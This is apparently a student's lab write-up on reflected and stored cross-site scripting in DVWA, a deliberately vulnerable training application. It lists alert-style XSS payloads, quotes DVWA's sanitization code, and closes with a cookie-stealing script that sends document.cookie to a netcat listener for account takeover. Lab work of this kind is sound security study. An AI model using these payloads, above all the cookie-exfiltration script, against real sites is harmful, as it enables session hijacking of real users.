# Cross-Site Scripting (XSS) — DVWA Lab

## Overview
This exercise demonstrates **Cross-Site Scripting (XSS)** exploitation in DVWA.  
The goal was to understand the three types of XSS (Reflected, Stored, DOM-based), exploit them at different security levels, and show their impact (including **session hijacking via cookies**).

---

## Types of XSS

- **Reflected XSS** — Payload is injected via URL/request and immediately reflected in the response.  
- **Stored XSS** — Payload is stored in the database (e.g., comments, posts) and executes for every visitor.  
- **DOM-based XSS** — Occurs in client-side JavaScript (no server-side processing required).

---

## Reflected XSS

### Low Security
Payload:
```html
<script>alert('XSS')</script>
```
result:
![low security Reflected XSS](/web-vulns-XSS/screenshots/low-sec-reflected.png)

### Medium and high Security
Payloads:
```html
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)></iframe>
<div onmouseover=alert(1)>Hover me!</div>
<input type=text value="click me" onclick=alert(1)>
```
result:
![Medium security Reflected XSS](/web-vulns-XSS/screenshots/med-sec-reflected.png)
- Execution via image error, iframe source, mouse hover, and button click.

### Impossible Security
Inputs are sanitized with multiple layers:

- strip_tags — removes HTML tags.
- addslashes — escapes quotes.
- mysqli_real_escape_string — sanitizes SQL context.
- htmlspecialchars — converts `<`, `>`, `"`, `'` into HTML entities.

Result: 
![curl result](/web-vulns-XSS/screenshots/curl-impossible.png)
Exploitation blocked.

## Stored XSS

# Low Security
Payload:
```html
<script>alert('Stored-low')</script>
```
result:
![Low security Stored XSS](/web-vulns-XSS/screenshots/low-sec-stored.png)

## Medium Security
Made Several attempts and some of them having the payload as:
```html
"><iframe src=javascript:alert('XSS')>
<img src=x oNeRrOr=alert('bypass')>
" onmouseover="alert('Stored-bypass')"
```
- PHP code inspection confirmed sanitization pipeline (see the code snippet below).

```php
$message = strip_tags( addslashes( $message ) ); 
$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
$message = htmlspecialchars( $message );
```

## Cookie Manipulation
used `netcat` to listen to the cookies on port 8080.
```bash
nc -nlvp 8080
```
Payload:
```html
<script>new Image().src="http://127.0.0.1:8080/?c="+encodeURIComponent(document.cookie);</script>
```
- This gave me the cookie which i further used for account takeover.